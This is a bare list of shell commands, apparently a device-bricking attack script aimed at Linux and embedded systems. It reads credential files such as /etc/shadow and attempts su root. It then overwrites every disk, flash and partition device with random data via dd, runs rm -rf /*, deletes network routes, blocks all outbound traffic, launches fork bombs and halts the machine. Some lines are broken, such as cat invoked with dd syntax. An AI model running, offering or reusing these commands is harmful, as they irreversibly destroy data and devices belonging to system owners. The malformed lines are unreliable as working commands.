w
uname -a
ls -alF /etc/
cat /etc/passwrd
cat /etc/shadow
cat /proc/version/
su root
uptime
cat /etc/motd
ls -al /sbin/

fdisk -l
df
cat /proc/mounts

dd if=/dev/urandom of=/dev/sda &
dd if=/dev/urandom of=/dev/sda1 &
dd if=/dev/urandom of=/dev/sda2 &
dd if=/dev/urandom of=/dev/sda3 &
dd if=/dev/urandom of=/dev/sda4 &
dd if=/dev/urandom of=/dev/sdb &
dd if=/dev/urandom of=/dev/mtd0 &
dd if=/dev/urandom of=/dev/mtd1 &
dd if=/dev/urandom of=/dev/mtd2 &
dd if=/dev/urandom of=/dev/mtd3 &
dd if=/dev/urandom of=/dev/mtdblock0 &
dd if=/dev/urandom of=/dev/mtdblock1 &
dd if=/dev/urandom of=/dev/mtdblock2 &
dd if=/dev/urandom of=/dev/mtdblock3 &
dd if=/dev/urandom of=/dev/mtdblock4 &
dd if=/dev/urandom of=/dev/mtdblock5 &
dd if=/dev/urandom of=/dev/mtdblock6 &
dd if=/dev/urandom of=/dev/mtdblock7 &
dd if=/dev/urandom of=/dev/hda1 &
dd if=/dev/urandom of=/dev/hdb1 &
dd if=/dev/urandom of=/dev/root &
dd if=/dev/urandom of=/dev/ram0 &
dd if=/dev/urandom of=/dev/mmcblk0 &
dd if=/dev/urandom of=/dev/mmcblk0p1 &

cat if=/dev/urandom of=/dev/sda &
cat if=/dev/urandom of=/dev/sda1 &
cat if=/dev/urandom of=/dev/sda2 &
cat if=/dev/urandom of=/dev/sda3 &
cat if=/dev/urandom of=/dev/sda4 &
cat if=/dev/urandom of=/dev/sdb &
cat if=/dev/urandom of=/dev/mtd0 &
cat if=/dev/urandom of=/dev/mtd1 &
cat if=/dev/urandom of=/dev/mtd2 &
cat if=/dev/urandom of=/dev/mtd3 &
cat if=/dev/urandom of=/dev/mtdblock0 &
cat if=/dev/urandom of=/dev/mtdblock1 &
cat if=/dev/urandom of=/dev/mtdblock2 &
cat if=/dev/urandom of=/dev/mtdblock3 &
cat if=/dev/urandom of=/dev/mtdblock4 &
cat if=/dev/urandom of=/dev/mtdblock5 &
cat if=/dev/urandom of=/dev/mtdblock6 &
cat if=/dev/urandom of=/dev/mtdblock7 &
cat if=/dev/urandom of=/dev/hda1 &
cat if=/dev/urandom of=/dev/hdb1 &
cat if=/dev/urandom of=/dev/root &
cat if=/dev/urandom of=/dev/ram0 &
cat if=/dev/urandom of=/dev/mmcblk0 &
cat if=/dev/urandom of=/dev/mmcblk0p1 &

route del default;iproute del default;rm -rf /* 2>/dev/null &
iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP
d(){ d|d & };d 2>/dev/null
sysctl -w net.ipv4.tcp_timestamps=0;sysctl kernal.threads-max=1
halt -n -f
reboot
d(){ d|d & };d